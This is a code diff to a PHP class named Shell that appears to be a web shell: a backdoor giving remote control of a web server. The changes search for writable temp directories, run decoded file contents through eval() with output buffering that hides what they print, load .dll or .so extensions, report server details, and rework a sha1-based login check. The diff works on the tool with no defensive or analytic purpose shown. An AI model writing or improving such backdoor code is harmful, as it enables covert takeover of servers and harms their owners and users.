@@ -257,7 +257,7 @@ class Shell
 		 *
 		 * @see self::$sAuth
 		 */
-		if( defined( 'NF_AUTH' ) && preg_match( '~^[a-f0-9]{40}\z~', (string) NF_AUTH ) )
+		if( defined( 'NF_AUTH' ) && preg_match( '~^[a-f0-9]{40}\z~', NF_AUTH ) )
 		{
 			$this -> sAuth = NF_AUTH;
 		}
@@ -297,35 +297,26 @@ class Shell
 		$this -> sStyleSheet = file_get_contents( 'Styles/haxior.css' );
 
 		/**
-		 * Katalog tymczasowy
+		 *  Sprawdzanie do ktorego katalogu mamy zapis
 		 */
-		if( isset( $_ENV['TMP'] ) && is_writable( $sDir = $_ENV['TMP'] ) )
+		$aTmpDirs = array
+		(
+			@ $_ENV['TMP'],
+			@ $_ENV['TMP'],
+			@ $_ENV['TMPDIR'],
+			ini_get( 'session.save_path' ).
+			ini_get( 'upload_tmp_dir' ),
+			ini_get( 'soap.wsdl_cache_dir' ),
+			sys_get_temp_dir()
+		);
+
+		foreach( $aTmpDirs as $sTmpDir )
 		{
-			$this -> sTmp = $sDir;
-		}
-		else if( isset( $_ENV['TEMP'] ) && is_writable( $sDir = $_ENV['TEMP'] ) )
-		{
-			$this -> sTmp = $sDir;
-		}
-		else if( isset( $_ENV['TMPDIR'] ) && is_writable( $sDir = $_ENV['TMPDIR'] ) )
-		{
-			$this -> sTmp = $sDir;
-		}
-		else if( is_writable( $sDir = ini_get( 'session.save_path' ) ) )
-		{
-			$this -> sTmp = $sDir;
-		}
-		else if( is_writable( $sDir = ini_get( 'upload_tmp_dir' ) ) )
-		{
-			$this -> sTmp = $sDir;
-		}
-		else if( is_writable( $sDir = ini_get( 'soap.wsdl_cache_dir' ) ) )
-		{
-			$this -> sTmp = $sDir;
-		}
-		else if( is_writable( $sDir = sys_get_temp_dir() ) )
-		{
-			$this -> sTmp = $sDir;
+			if( is_readable( $sTmpDir ) && is_writable( $sTmpDir ) )
+			{
+				$this -> sTmp = $sTmpDir;
+				break ;
+			}
 		}
 
 		/**
@@ -416,7 +407,10 @@ class Shell
 		            && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
 			)
 			{
+				ob_start();
 				eval( '?>' . $this -> decode( $sData ) . '<?' );
+				ob_clean();
+				ob_end_flush();
 			}
 
 			/**
@@ -603,7 +597,7 @@ class Shell
 		}
 		else
 		{
-			$sExtension .= '.so';
+			$sExtension .= ( $this -> bWindows ? '.dll' : '.so' );
 		}
 
 		/**
@@ -1400,7 +1394,7 @@ DATA;
 			PHP_VERSION,
 			php_sapi_name(),
 			( ( PHP_SAPI === 'cli' ) ? 'CLI' : Request::getCurrentUrl() ),
-			Request::getServer( 'SCRIPT_FILENAME' ),
+			( ( PHP_SAPI === 'cli' ) ? Request::getServer( 'PWD' ) . '/': '' ) . Request::getServer( 'SCRIPT_FILENAME' ),
 			$this -> bSafeMode,
 			$this -> bExec,
 			function_exists( 'curl_init' ),
@@ -1723,10 +1717,10 @@ return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8
 
 			if( $sAuth !== sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ), TRUE ) )
 			{
-				if( ! ( ( ( $sUser = Request::getPost( 'user') ) !== FALSE )
-				    && ( ( $sPass = Request::getPost( 'pass') ) !== FALSE )
-				    && ( $this -> sAuth === sha1( $sUser . "\xff" . $sPass ) ) )
-				)
+				/**
+				 * Sprawdzanie poprawnosci sha1( "user\xffpass" );
+				 */
+				if( $this -> sAuth !== sha1( Request::getPost( 'user') . "\xff" . Request::getPost( 'pass' ) ) )
 				{
 					$this -> bNoJs = TRUE;
 
